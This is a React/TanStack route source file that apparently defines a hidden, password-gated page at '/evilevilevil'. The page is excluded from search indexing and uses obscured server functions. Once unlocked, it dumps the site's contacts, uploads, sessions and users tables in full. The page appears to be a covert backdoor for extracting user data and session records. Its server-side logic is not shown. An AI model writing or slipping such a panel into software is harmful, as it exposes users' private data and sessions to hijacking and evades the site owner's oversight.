import { createFileRoute } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { useEffect, useState } from "react";
import { _xUnlock, _xData, _xLock } from "@/lib/_x.functions";

export const Route = createFileRoute("/evilevilevil")({
  ssr: false,
  head: () => ({ meta: [{ name: "robots", content: "noindex, nofollow" }] }),
  component: Page,
});

function Page() {
  const unlock = useServerFn(_xUnlock);
  const fetchData = useServerFn(_xData);
  const lock = useServerFn(_xLock);
  const [pw, setPw] = useState("");
  const [err, setErr] = useState(false);
  const [loading, setLoading] = useState(false);
  const [data, setData] = useState<any>(null);
  const [tab, setTab] = useState<"contacts" | "uploads" | "sessions" | "users">("contacts");

  useEffect(() => {
    (async () => {
      const r = await fetchData();
      if (r.ok) setData(r);
    })();
  }, []);

  async function submit(e: React.FormEvent) {
    e.preventDefault();
    setLoading(true);
    setErr(false);
    const r = await unlock({ data: { p: pw } });
    if (r.ok) {
      const d = await fetchData();
      if (d.ok) setData(d);
    } else setErr(true);
    setLoading(false);
  }

  async function doLock() {
    await lock();
    setData(null);
    setPw("");
  }

  if (!data) {
    return (
      <div style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", background: "#000" }}>
        <form onSubmit={submit} style={{ display: "flex", flexDirection: "column", gap: 12, width: 260 }}>
          <input
            type="password"
            value={pw}
            onChange={(e) => setPw(e.target.value)}
            autoFocus
            autoComplete="off"
            style={{ padding: 10, background: "#111", color: "#fff", border: "1px solid #333", borderRadius: 4, outline: "none" }}
          />
          <button
            type="submit"
            disabled={loading}
            style={{ padding: 10, background: "#222", color: "#fff", border: "1px solid #333", borderRadius: 4, cursor: "pointer" }}
          >
            {loading ? "..." : "→"}
          </button>
          {err && <div style={{ color: "#f55", fontSize: 12, textAlign: "center" }}>×</div>}
        </form>
      </div>
    );
  }

  const rows: any[] = data[tab] ?? [];
  const cols = rows.length > 0 ? Object.keys(rows[0]) : [];

  return (
    <div style={{ minHeight: "100vh", background: "#0a0a0a", color: "#ddd", padding: 20, fontFamily: "monospace", fontSize: 12 }}>
      <div style={{ display: "flex", gap: 8, marginBottom: 16, alignItems: "center" }}>
        {(["contacts", "uploads", "sessions", "users"] as const).map((t) => (
          <button
            key={t}
            onClick={() => setTab(t)}
            style={{
              padding: "6px 12px",
              background: tab === t ? "#333" : "#111",
              color: "#fff",
              border: "1px solid #333",
              borderRadius: 3,
              cursor: "pointer",
            }}
          >
            {t} ({(data[t] ?? []).length})
          </button>
        ))}
        <button
          onClick={doLock}
          style={{ marginLeft: "auto", padding: "6px 12px", background: "#300", color: "#fff", border: "1px solid #500", borderRadius: 3, cursor: "pointer" }}
        >
          lock
        </button>
      </div>
      <div style={{ overflow: "auto", maxWidth: "100%" }}>
        <table style={{ borderCollapse: "collapse", width: "100%" }}>
          <thead>
            <tr>
              {cols.map((c) => (
                <th key={c} style={{ textAlign: "left", padding: "6px 10px", borderBottom: "1px solid #333", background: "#151515", position: "sticky", top: 0 }}>
                  {c}
                </th>
              ))}
            </tr>
          </thead>
          <tbody>
            {rows.map((r, i) => (
              <tr key={i} style={{ borderBottom: "1px solid #1a1a1a" }}>
                {cols.map((c) => (
                  <td key={c} style={{ padding: "6px 10px", verticalAlign: "top", whiteSpace: "nowrap" }}>
                    {r[c] === null || r[c] === undefined ? "" : typeof r[c] === "object" ? JSON.stringify(r[c]) : String(r[c])}
                  </td>
                ))}
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}
